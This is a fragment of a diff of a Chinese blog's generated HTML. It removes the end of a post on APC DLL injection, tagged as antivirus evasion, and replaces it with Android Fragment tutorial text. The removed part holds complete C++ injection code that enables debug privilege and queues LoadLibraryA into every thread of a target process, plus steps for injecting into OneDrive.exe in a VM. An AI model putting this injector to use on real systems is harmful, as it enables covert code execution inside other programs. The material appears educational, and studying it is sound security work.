-<h2 id="2-3代码实现"><a href="#2-3代码实现" class="headerlink" title="2.3代码实现"></a>2.3代码实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">//提权函数</span><br><span class="line">BOOL EnableDebugPrivilege() &#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = 1;</span><br><span class="line">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span><br><span class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span><br><span class="line">		fok = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	return fok;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APCInjectDLL(DWORD dwPid, char* pszDllName) &#123;</span><br><span class="line">	EnableDebugPrivilege(); </span><br><span class="line">	//打开进程,获取进程句柄</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	if (hProcess == NULL) &#123; return FALSE; &#125;</span><br><span class="line">	//向目标进程申请空间写入dll全路径 </span><br><span class="line">	int nSize = strlen(pszDllName);</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nSize, MEM_COMMIT, PAGE_READWRITE); </span><br><span class="line">	SIZE_T dwWrittenSize = 0; </span><br><span class="line">	WriteProcessMemory(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize); </span><br><span class="line">	//获取LoadLibraryA的地址</span><br><span class="line">	HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	FARPROC pFuncAddr = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); </span><br><span class="line">	//创建线程快照</span><br><span class="line">	THREADENTRY32 te = &#123; 0 &#125;; </span><br><span class="line">	te.dwSize = sizeof(te);</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);</span><br><span class="line">	if (hSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125;</span><br><span class="line">	DWORD dwRet = 0;</span><br><span class="line">	HANDLE hThread = NULL; </span><br><span class="line">	if (Thread32First(hSnap, &amp;te)) &#123; </span><br><span class="line">		do &#123;</span><br><span class="line">			if (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">				hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">				if (hThread) &#123;</span><br><span class="line">					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)pDllAddr);</span><br><span class="line">					hThread = NULL;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; while (Thread32Next(hSnap, &amp;te));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess); </span><br><span class="line">	CloseHandle(hSnap); </span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;int main(int argc, char* argv[]) &#123; </span><br><span class="line">	if (argc == 3) &#123; </span><br><span class="line">		if (FALSE == APCInjectDLL((DWORD)_tstol(argv[1]), argv[2])) </span><br><span class="line">			printf(&quot;APCInject failed\n&quot;); else</span><br><span class="line">			printf(&quot;APCInject successfully\n&quot;); </span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		printf(&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;);</span><br><span class="line">		printf(&quot;Example: %s 520 C:\\test.dll\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>将程序和要注入的dll放入虚拟机。在cmd中使用tasklist命令查看进程id。</p>
-<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png" alt="image-20230912111408508"></p>
-<p>找到一个OneDrive.exe,PID为5776</p>
-<p>输入命令注入，结果如图：</p>
-<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png" alt="image-20230912111646582"></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇简单介绍了apc注入的基本概念和流程，如果有哪里讲述不对的地还望各位大佬赐教。</p>
+<p>查找fragment可以使用FragmentManager对象（如fragmentManager）的<code>findFragmentById(View资源标识符)</code>也可以使用Fragment Transaction中指定的标记<code>(fragmentManager.findFragmentByTag</code>)来找到对应的fragment。</p>
+<h3 id="Fragment动画事务"><a href="#Fragment动画事务" class="headerlink" title="Fragment动画事务"></a>Fragment动画事务</h3><p>要应用默认的专场动画，可在任何Fragment Transaction上使用setTransition方法，并传入一个FragmentTransaction.TRANSIT_FRAGMENT_*常量值。在调用Fragment Transaction的add或者remove方法之前，还可以使用setCustomAnimations方法将自定义动画应用到Fragment上。这个方法接受两个Object Animator的XML资源：一个用于添加到布局中的Fragment，另一个用于从布局中移除的Fragment。</p>
 
       
     </div>
@@ -469,7 +471,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
+            <a href="/tags/Android/" rel="tag"># Android</a>
           
         </div>
       
@@ -482,8 +484,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2023/08/31/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/" rel="next" title="dll注入与session0注入">
-                <i class="fa fa-chevron-left"></i> dll注入与session0注入
+              <a href="/2023/11/04/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/" rel="next" title="初步探究angr与ctf">
+                <i class="fa fa-chevron-left"></i> 初步探究angr与ctf
               </a>
             
           </div>
@@ -491,10 +493,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2023/09/22/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/" rel="prev" title="进程隐藏与强杀">
-                进程隐藏与强杀 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -632,7 +630,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81APC%E6%9C%BA%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">一、APC机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1APC%E8%B0%83%E7%94%A8%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">1.1APC调用的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2QueueUserAPC%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">1.2QueueUserAPC函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3APC%E9%98%9F%E5%88%97"><span class="nav-number">1.3.</span> <span class="nav-text">1.3APC队列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4APC%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">1.4APC函数执行流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-1%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.4.1相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-2QueueUserApc"><span class="nav-number">1.4.2.</span> <span class="nav-text">1.4.2QueueUserApc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-3%E7%94%A8%E6%88%B7APC"><span class="nav-number">1.4.3.</span> <span class="nav-text">1.4.3用户APC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81apc%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">二、apc注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.1.</span> <span class="nav-text">2.1步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">2.2流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.3.</span> <span class="nav-text">2.3代码实现</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">Android应用简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Android%E8%BD%AF%E4%BB%B6%E5%A0%86%E5%B1%82"><span class="nav-number">1.1.</span> <span class="nav-text">Android软件堆层</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Android%E5%BA%94%E7%94%A8%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">Android应用的组件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Android%E5%BA%94%E7%94%A8%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E3%80%81%E4%BC%98%E5%85%88%E7%BA%A7%E5%92%8C%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81"><span class="nav-number">1.3.</span> <span class="nav-text">Android应用的生命周期、优先级和进程状态</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%85%88%E7%BA%A7"><span class="nav-number">1.3.1.</span> <span class="nav-text">优先级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Activity%E7%8A%B6%E6%80%81%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="nav-number">1.3.2.</span> <span class="nav-text">Activity状态与生命周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fragment%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="nav-number">1.3.3.</span> <span class="nav-text">Fragment生命周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fragment-Manager%E5%92%8CFragment-Transaction"><span class="nav-number">1.3.4.</span> <span class="nav-text">Fragment  Manager和Fragment Transaction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fragment%E5%8A%A8%E7%94%BB%E4%BA%8B%E5%8A%A1"><span class="nav-number">1.3.5.</span> <span class="nav-text">Fragment动画事务</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
